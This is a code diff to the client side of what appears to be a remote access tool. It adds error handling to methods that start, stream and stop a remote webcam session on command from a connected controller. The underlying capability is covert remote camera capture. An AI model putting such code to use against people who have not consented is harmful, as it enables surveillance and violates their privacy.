@@ -75,82 +75,152 @@ namespace Pulsar.Client.Messages
 
         private void StartWebcamStreaming(ISender client, GetWebcam message)
         {
-            _webcamHelper.StartWebcam(message.DisplayIndex);
-            Debug.WriteLine("Starting remote webcam session");
-
-            var webcamBounds = _webcamHelper.GetBounds();
-            var resolution = new Resolution { Height = webcamBounds.Height, Width = webcamBounds.Width };
-
-            if (_streamCodec == null)
-                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
-
-            if (message.CreateNew)
+            try
             {
-                _streamCodec?.Dispose();
-                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
-                OnReport("Remote webcam session started");
+                try
+                {
+                    _webcamHelper.StartWebcam(message.DisplayIndex);
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine($"Error starting webcam: {ex.Message}");
+                    OnReport("Failed to start webcam: " + ex.Message);
+                    return;
+                }
+                Debug.WriteLine("Starting remote webcam session");
+
+                var webcamBounds = _webcamHelper.GetBounds();
+                var resolution = new Resolution { Height = webcamBounds.Height, Width = webcamBounds.Width };
+
+                try
+                {
+                    if (_streamCodec == null)
+                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
+
+                    if (message.CreateNew)
+                    {
+                        _streamCodec?.Dispose();
+                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
+                        OnReport("Remote webcam session started");
+                    }
+
+                    if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
+                    {
+                        _streamCodec?.Dispose();
+                        _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
+                    }
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine($"Error initializing stream codec: {ex.Message}");
+                    OnReport("Failed to initialize stream codec: " + ex.Message);
+                    return;
+                }
+
+                _clientMain = client;
+
+                // clear any pending frame requests and existing frames
+                ClearFrameBuffer();
+                Interlocked.Exchange(ref _pendingFrameRequests, message.FramesRequested);
+
+                if (_captureThread == null || !_captureThread.IsAlive)
+                {
+                    try
+                    {
+                        _cancellationTokenSource = new CancellationTokenSource();
+                        _captureThread = new Thread(() => BufferedCaptureLoop(_cancellationTokenSource.Token));
+                        _captureThread.Start();
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"Error starting capture thread: {ex.Message}");
+                        OnReport("Failed to start capture thread: " + ex.Message);
+                    }
+                }
             }
-
-            if (_streamCodec.ImageQuality != message.Quality || _streamCodec.Monitor != message.DisplayIndex || _streamCodec.Resolution != resolution)
+            catch (Exception ex)
             {
-                _streamCodec?.Dispose();
-                _streamCodec = new UnsafeStreamCodec(message.Quality, message.DisplayIndex, resolution);
-            }
-
-            _clientMain = client;
-
-            // clear any pending frame requests and existing frames
-            ClearFrameBuffer();
-            Interlocked.Exchange(ref _pendingFrameRequests, message.FramesRequested);
-
-            if (_captureThread == null || !_captureThread.IsAlive)
-            {
-                _cancellationTokenSource = new CancellationTokenSource();
-                _captureThread = new Thread(() => BufferedCaptureLoop(_cancellationTokenSource.Token));
-                _captureThread.Start();
+                Debug.WriteLine($"Unexpected error in StartWebcamStreaming: {ex.Message}");
+                OnReport("Unexpected error: " + ex.Message);
             }
         }
 
         private void StopWebcamStreaming()
         {
-            _webcamHelper.StopWebcam();
-            Debug.WriteLine("Stopping remote webcam session");
-
-            _cancellationTokenSource?.Cancel();
-
-            if (_captureThread != null && _captureThread.IsAlive)
+            try
             {
-                _frameRequestEvent.Set(); // wake up thread
-                _captureThread.Join();
-                _captureThread = null;
-            }
+                try
+                {
+                    _webcamHelper.StopWebcam();
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine($"Error stopping webcam: {ex.Message}");
+                }
+                Debug.WriteLine("Stopping remote webcam session");
 
-            if (_webcam != null)
-            {
-                if (_webcamData != null)
+                _cancellationTokenSource?.Cancel();
+
+                if (_captureThread != null && _captureThread.IsAlive)
                 {
                     try
                     {
-                        _webcam.UnlockBits(_webcamData);
+                        _frameRequestEvent.Set(); // wake up thread
+                        _captureThread.Join();
                     }
-                    catch
+                    catch (Exception ex)
                     {
+                        Debug.WriteLine($"Error joining capture thread: {ex.Message}");
                     }
-                    _webcamData = null;
+                    _captureThread = null;
                 }
-                _webcam.Dispose();
-                _webcam = null;
-            }
 
-            if (_streamCodec != null)
+                if (_webcam != null)
+                {
+                    if (_webcamData != null)
+                    {
+                        try
+                        {
+                            _webcam.UnlockBits(_webcamData);
+                        }
+                        catch (Exception ex)
+                        {
+                            Debug.WriteLine($"Error unlocking bits: {ex.Message}");
+                        }
+                        _webcamData = null;
+                    }
+                    try
+                    {
+                        _webcam.Dispose();
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"Error disposing webcam: {ex.Message}");
+                    }
+                    _webcam = null;
+                }
+
+                if (_streamCodec != null)
+                {
+                    try
+                    {
+                        _streamCodec.Dispose();
+                    }
+                    catch (Exception ex)
+                    {
+                        Debug.WriteLine($"Error disposing stream codec: {ex.Message}");
+                    }
+                    _streamCodec = null;
+                }
+
+                // clear the buffer
+                ClearFrameBuffer();
+                Interlocked.Exchange(ref _pendingFrameRequests, 0);
+            }
+            catch (Exception ex)
             {
-                _streamCodec.Dispose();
-                _streamCodec = null;
+                Debug.WriteLine($"Unexpected error in StopWebcamStreaming: {ex.Message}");
             }
-
-            // clear the buffer
-            ClearFrameBuffer();
-            Interlocked.Exchange(ref _pendingFrameRequests, 0);
         }
 
         private void BufferedCaptureLoop(CancellationToken cancellationToken)
